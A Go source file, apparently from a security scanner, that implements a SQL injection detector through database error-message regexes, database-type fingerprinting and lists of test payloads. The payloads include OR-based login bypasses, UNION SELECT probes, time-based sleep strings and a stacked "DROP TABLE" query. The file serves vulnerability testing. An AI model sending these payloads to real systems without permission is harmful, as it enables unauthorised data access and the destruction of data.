package injection

import (
	"regexp"
	"strings"
)

// PayloadContext represents the detected context of a parameter.
type PayloadContext int

const (
	ContextUnknown PayloadContext = iota
	ContextString
	ContextNumeric
)

// String returns the string representation of PayloadContext.
func (c PayloadContext) String() string {
	switch c {
	case ContextString:
		return "string"
	case ContextNumeric:
		return "numeric"
	default:
		return "unknown"
	}
}

// DatabaseType represents the detected database type.
type DatabaseType int

const (
	DBUnknown DatabaseType = iota
	DBMySQL
	DBPostgreSQL
	DBMSSQL
	DBOracle
	DBSQLite
)

// String returns the string representation of DatabaseType.
func (d DatabaseType) String() string {
	switch d {
	case DBMySQL:
		return "mysql"
	case DBPostgreSQL:
		return "postgresql"
	case DBMSSQL:
		return "mssql"
	case DBOracle:
		return "oracle"
	case DBSQLite:
		return "sqlite"
	default:
		return "unknown"
	}
}

// AnalysisResult contains the result of SQL injection analysis.
type AnalysisResult struct {
	IsVulnerable  bool
	DetectionType string
	Confidence    float64
	Evidence      string
	DatabaseType  DatabaseType
}

// SQLiDetector detects SQL injection vulnerabilities.
type SQLiDetector struct {
	errorPatterns map[DatabaseType][]*regexp.Regexp
}

// NewSQLiDetector creates a new SQL injection detector.
func NewSQLiDetector() *SQLiDetector {
	detector := &SQLiDetector{
		errorPatterns: make(map[DatabaseType][]*regexp.Regexp),
	}
	detector.initErrorPatterns()
	return detector
}

// Name returns the detector name.
func (d *SQLiDetector) Name() string {
	return "sqli"
}

// Description returns the detector description.
func (d *SQLiDetector) Description() string {
	return "SQL Injection vulnerability detector using error-based, boolean-based, and time-based techniques"
}

// initErrorPatterns initializes database-specific error patterns.
func (d *SQLiDetector) initErrorPatterns() {
	// MySQL patterns
	d.errorPatterns[DBMySQL] = []*regexp.Regexp{
		regexp.MustCompile(`(?i)you have an error in your sql syntax`),
		regexp.MustCompile(`(?i)check the manual that corresponds to your (mysql|mariadb) server version`),
		regexp.MustCompile(`(?i)mysql.*error`),
		regexp.MustCompile(`(?i)warning.*mysql`),
	}

	// PostgreSQL patterns
	d.errorPatterns[DBPostgreSQL] = []*regexp.Regexp{
		regexp.MustCompile(`(?i)ERROR:\s*syntax error at or near`),
		regexp.MustCompile(`(?i)pg_query\(\).*failed`),
		regexp.MustCompile(`(?i)unterminated quoted string`),
		regexp.MustCompile(`(?i)postgresql.*error`),
	}

	// MSSQL patterns
	d.errorPatterns[DBMSSQL] = []*regexp.Regexp{
		regexp.MustCompile(`(?i)unclosed quotation mark`),
		regexp.MustCompile(`(?i)microsoft sql server`),
		regexp.MustCompile(`(?i)mssql.*error`),
		regexp.MustCompile(`(?i)sql server.*error`),
	}

	// Oracle patterns
	d.errorPatterns[DBOracle] = []*regexp.Regexp{
		regexp.MustCompile(`(?i)ORA-\d{5}`),
		regexp.MustCompile(`(?i)oracle.*error`),
		regexp.MustCompile(`(?i)quoted string not properly terminated`),
	}

	// SQLite patterns
	d.errorPatterns[DBSQLite] = []*regexp.Regexp{
		regexp.MustCompile(`(?i)SQLITE_ERROR`),
		regexp.MustCompile(`(?i)sqlite3\..*Error`),
		regexp.MustCompile(`(?i)SQLite.*syntax`),
	}
}

// genericSQLPatterns returns patterns that indicate SQL errors regardless of database type.
var genericSQLPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)sql\s*syntax.*error`),
	regexp.MustCompile(`(?i)syntax\s*error.*sql`),
	regexp.MustCompile(`(?i)unexpected\s*end\s*of\s*sql`),
	regexp.MustCompile(`(?i)invalid\s*sql`),
	regexp.MustCompile(`(?i)sql\s*command`),
}

// AnalyzeResponse analyzes an HTTP response for SQL injection indicators.
func (d *SQLiDetector) AnalyzeResponse(response string) *AnalysisResult {
	result := &AnalysisResult{
		IsVulnerable: false,
		DatabaseType: DBUnknown,
	}

	if response == "" {
		return result
	}

	// Check database-specific patterns
	for dbType, patterns := range d.errorPatterns {
		for _, pattern := range patterns {
			if pattern.MatchString(response) {
				result.IsVulnerable = true
				result.DetectionType = "error-based"
				result.DatabaseType = dbType
				result.Evidence = extractMatch(pattern, response)
				result.Confidence = 0.9
				return result
			}
		}
	}

	// Check generic SQL patterns
	for _, pattern := range genericSQLPatterns {
		if pattern.MatchString(response) {
			result.IsVulnerable = true
			result.DetectionType = "error-based"
			result.Evidence = extractMatch(pattern, response)
			result.Confidence = 0.7
			return result
		}
	}

	return result
}

// extractMatch extracts the matching portion from the response.
func extractMatch(pattern *regexp.Regexp, response string) string {
	match := pattern.FindString(response)
	if len(match) > 100 {
		return match[:100] + "..."
	}
	return match
}

// DetectDBType detects the database type from response content.
func (d *SQLiDetector) DetectDBType(response string) DatabaseType {
	responseLower := strings.ToLower(response)

	// Check for database-specific indicators
	if strings.Contains(responseLower, "mysql") ||
		strings.Contains(response, "MariaDB") {
		return DBMySQL
	}

	if strings.Contains(responseLower, "postgresql") ||
		strings.Contains(responseLower, "pg_") ||
		strings.Contains(response, "ERROR: syntax error at or near") {
		return DBPostgreSQL
	}

	if strings.Contains(responseLower, "microsoft sql server") ||
		strings.Contains(responseLower, "mssql") ||
		strings.Contains(responseLower, "sql server") {
		return DBMSSQL
	}

	if strings.Contains(response, "ORA-") ||
		strings.Contains(responseLower, "oracle") {
		return DBOracle
	}

	if strings.Contains(response, "SQLITE") ||
		strings.Contains(responseLower, "sqlite") {
		return DBSQLite
	}

	return DBUnknown
}

// GetPayloads returns a list of SQL injection test payloads.
func (d *SQLiDetector) GetPayloads() []string {
	return []string{
		// Basic quotes
		"'",
		"\"",

		// Classic OR-based
		"' OR '1'='1",
		"\" OR \"1\"=\"1",
		"' OR '1'='1' --",
		"' OR '1'='1' #",
		"1 OR 1=1",
		"1' OR '1'='1",

		// Comment-based
		"'--",
		"'#",
		"' /*",

		// UNION-based
		"' UNION SELECT NULL--",
		"' UNION SELECT NULL,NULL--",
		"' UNION ALL SELECT NULL--",

		// Stacked queries
		"'; SELECT 1--",
		"'; DROP TABLE test--",

		// Time-based
		"' OR SLEEP(5)--",
		"'; WAITFOR DELAY '0:0:5'--",
		"' OR pg_sleep(5)--",

		// Error-based
		"' AND 1=CONVERT(int, @@version)--",
		"' AND EXTRACTVALUE(1, CONCAT(0x7e, version()))--",
	}
}

// GetContextPayloads returns payloads optimized for the detected context.
func (d *SQLiDetector) GetContextPayloads(context PayloadContext) []string {
	switch context {
	case ContextString:
		return []string{
			"'",
			"''",
			"' OR '1'='1",
			"' OR '1'='1'--",
			"' AND '1'='2",
			"' UNION SELECT NULL--",
		}
	case ContextNumeric:
		return []string{
			"1 OR 1=1",
			"1 AND 1=2",
			"1 UNION SELECT NULL",
			"1; SELECT 1",
		}
	default:
		// Unknown context - return comprehensive set
		return []string{
			"'",
			"\"",
			"' OR '1'='1",
			"1 OR 1=1",
			"' UNION SELECT NULL--",
			"1 UNION SELECT NULL",
			"'--",
			"'; SELECT 1--",
		}
	}
}
